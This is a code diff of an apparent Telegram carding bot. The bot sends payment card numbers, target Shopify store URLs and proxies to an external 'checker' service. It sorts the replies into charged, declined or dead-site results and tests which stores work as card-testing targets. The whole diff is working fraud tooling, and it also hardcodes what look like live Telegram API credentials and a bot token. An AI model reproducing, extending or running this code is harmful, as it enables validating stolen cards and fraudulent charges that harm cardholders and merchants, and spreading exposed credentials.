@@ -13,7 +13,7 @@ API_ID = 32423382
 API_HASH = '0a53d15b7ad12fee5abccee5a5403859'
 BOT_TOKEN = '8931958985:AAFSWu8x-gpUv0YWpovNz-foqh1QlUdl4ZI'
 ADMIN_ID = [6390225218]
-CHECKER_API_URL = 'https://neoshopifyapi.up.railway.app/shopify'
+CHECKER_API_URL = 'https://nik.cards/shopify'
 
 
 
@@ -467,44 +467,30 @@ def get_price_from_response(raw_response):
     except:
         return 0.0
 
-def is_site_dead(response_msg, gateway, price):
-    if not response_msg:
-        return True
-    
-    response_lower = response_msg.lower()
-    
-    # Truly dead keywords (DNS, host not found, cloudflare block, 404, etc.)
-    dead_keywords = [
-        'invalid url', 'could not resolve', 'domain name not found',
-        'name or service not known', 'empty reply from server', 
-        'connection refused', 'host not found', 'domain not found',
-        'could not connect', 'connection error', 'gateway timeout',
-        '502 bad gateway', '503 service unavailable', '504 gateway timeout',
-        'cloudflare error', 'access denied', 'blocked',
-        'site error', 'status: 429', 'status: 403', 'status: 400',
-        'too many requests', 'rate limit', 'status: 500', 'status: 502',
-        'status: 503', 'status: 504', 'not shopify', 'no payment gateway',
-        'failed to add to cart', 'out of stock', 'checkout not found',
-        'no checkout page', 'gateway not supported', 'failed to get checkout',
-        'proxy error', 'cannot connect', 'failed', 'refused'
-    ]
-    
-    for keyword in dead_keywords:
-        if keyword in response_lower:
-            return True
-            
-    # If the response indicates any actual checkout/card processing attempt occurred, even if it failed/declined
-    alive_indicators = [
-        'declined', 'insufficient', 'stolen', 'lost', 'pickup', 'incorrect', 
-        'invalid', 'restricted', 'call bank', 'authentication', '3d', 'otp', 
-        'success', 'charged', 'thank you', 'payment successful', 'amount too small',
-        'transaction', 'card', 'cvv', 'cvc', 'zip', 'postal', 'pin', 'approve'
-    ]
-    
-    if any(indicator in response_lower for indicator in alive_indicators):
+def is_site_dead(response_text):
+    if not response_text: return True
+    response_lower = response_text.lower()
+    if "http_error" in response_lower or "invalid json" in response_lower or "exception:" in response_lower:
         return False
-        
-    return True
+
+    dead_indicators = [
+        'invalid url', 'error in 1st req', 'error in 1 req',
+        'cloudflare', 'connection failed', 'timed out',
+        'access denied', 'tlsv1 alert', 'ssl routines',
+        'could not resolve', 'domain name not found',
+        'name or service not known', 'openssl ssl_connect',
+        'empty reply from server', 'HTTPERROR504', 'http error',
+        'httperror504', 'timeout', 'unreachable', 'ssl error',
+        '502', '503', '504', 'bad gateway', 'service unavailable',
+        'gateway timeout', 'network error', 'connection reset', 
+        'submit rejected', 'handle error', 'http 404',
+        'url rejected', 'malformed input', 'SITE DEAD', 'site dead',
+        'CAPTCHA_REQUIRED', 'captcha_required', 'captcha required', 'Site errors',
+        'password', 'private', 'coming soon', 'checkout disabled', 'locked', 'unauthorized',
+        'pp_q', 'pp_queue', 'paypal queue', 'paypal_queue', 'paypal_checkout', 'paypal express'
+    ]
+
+    return any(indicator in response_lower for indicator in dead_indicators)
 
 async def get_bin_info(card_number):
     try:
@@ -663,7 +649,8 @@ async def check_card(card, site, proxy):
             return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
         if not site.startswith('http'):
             site = f'https://{site}'
-        proxy_str = None
+        
+        proxy_str = ""
         if proxy:
             proxy_parts = proxy.split(':')
             if len(proxy_parts) == 4:
@@ -672,21 +659,40 @@ async def check_card(card, site, proxy):
             elif len(proxy_parts) == 2:
                 ip, port = proxy_parts
                 proxy_str = f"{ip}:{port}"
-            else:
-                proxy_str = proxy
-        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
-        if proxy_str:
-            url += f'&proxy={proxy_str}'
+        
         timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(url) as resp:
-                if resp.status != 200:
-                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
-                try:
-                    raw = await resp.json()
-                except:
-                    text = await resp.text()
-                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
+            base_url_clean = CHECKER_API_URL.rstrip('/')
+            
+            async def fetch_and_parse(session_obj):
+                from urllib.parse import urlparse
+                parsed_url = urlparse(base_url_clean)
+                if parsed_url.path and parsed_url.path != "/":
+                    import yarl
+                    url = yarl.URL(base_url_clean).with_query({
+                        'site': site,
+                        'cc': card,
+                        'proxy': proxy_str
+                    })
+                    async with session_obj.get(url) as res:
+                        return res.status, await res.read()
+                else:
+                    url = f"{base_url_clean}/check"
+                    payload = {"cc": card, "site": site, "proxy": proxy_str}
+                    async with session_obj.post(url, json=payload) as res:
+                        return res.status, await res.read()
+            
+            status_code, response_bytes = await fetch_and_parse(session)
+            if status_code != 200:
+                return {'status': 'Site Error', 'message': f'HTTP {status_code}', 'card': card, 'retry': True}
+            
+            try:
+                import json
+                raw = json.loads(response_bytes.decode('utf-8'))
+            except:
+                text = response_bytes.decode('utf-8', errors='ignore')
+                return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
+                
         response_msg = raw.get('Response', '')
         price = raw.get('Price', '-')
         price_value = get_price_from_response(raw)
@@ -695,7 +701,7 @@ async def check_card(card, site, proxy):
         else:
             price_display = '-'
         gateway = raw.get('Gateway', 'Shopify')
-        if is_site_dead(response_msg, gateway, price_display):
+        if is_site_dead(response_msg):
             return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price_display, 'price_value': price_value}
         response_lower = response_msg.lower()
         if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
@@ -739,7 +745,8 @@ async def test_site_with_price(site, proxy):
         try:
             if not site.startswith('http'):
                 site = f'https://{site}'
-            proxy_str = None
+            
+            proxy_str = ""
             if current_proxy:
                 proxy_parts = current_proxy.split(':')
                 if len(proxy_parts) == 4:
@@ -748,24 +755,43 @@ async def test_site_with_price(site, proxy):
                 elif len(proxy_parts) == 2:
                     ip, port = proxy_parts
                     proxy_str = f"{ip}:{port}"
-            url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
-            if proxy_str:
-                url += f'&proxy={proxy_str}'
-            timeout = aiohttp.ClientTimeout(total=30)
+            
+            timeout = aiohttp.ClientTimeout(total=45)
             async with aiohttp.ClientSession(timeout=timeout) as session:
-                async with session.get(url) as resp:
-                    if resp.status != 200:
-                        continue
-                    try:
-                        raw = await resp.json()
-                    except:
-                        continue
-            response_msg = raw.get('Response', '')
-            gateway = raw.get('Gateway', '')
-            price_display = raw.get('Price', '-')
-            price_value = get_price_from_response(raw)
-            status_api = raw.get('Status')
-            if is_site_dead(response_msg, gateway, price_display) or status_api is False or str(status_api).lower() == 'false':
+                base_url_clean = CHECKER_API_URL.rstrip('/')
+                
+                async def fetch_and_parse(session_obj):
+                    from urllib.parse import urlparse
+                    parsed_url = urlparse(base_url_clean)
+                    if parsed_url.path and parsed_url.path != "/":
+                        import yarl
+                        url = yarl.URL(base_url_clean).with_query({
+                            'site': site,
+                            'cc': test_card,
+                            'proxy': proxy_str
+                        })
+                        async with session_obj.get(url) as res:
+                            return res.status, await res.read()
+                    else:
+                        url = f"{base_url_clean}/check"
+                        payload = {"cc": test_card, "site": site, "proxy": proxy_str}
+                        async with session_obj.post(url, json=payload) as res:
+                            return res.status, await res.read()
+                
+                status_code, response_bytes = await fetch_and_parse(session)
+                if status_code != 200:
+                    continue
+                
+                try:
+                    import json
+                    response_json = json.loads(response_bytes.decode('utf-8'))
+                except:
+                    continue
+                
+            response_msg = str(response_json.get("Response", "") or "")
+            price_value = get_price_from_response(response_json)
+            
+            if is_site_dead(response_msg):
                 return {'site': site, 'status': 'dead', 'price': 0.0}
             else:
                 return {'site': site, 'status': 'alive', 'price': price_value}
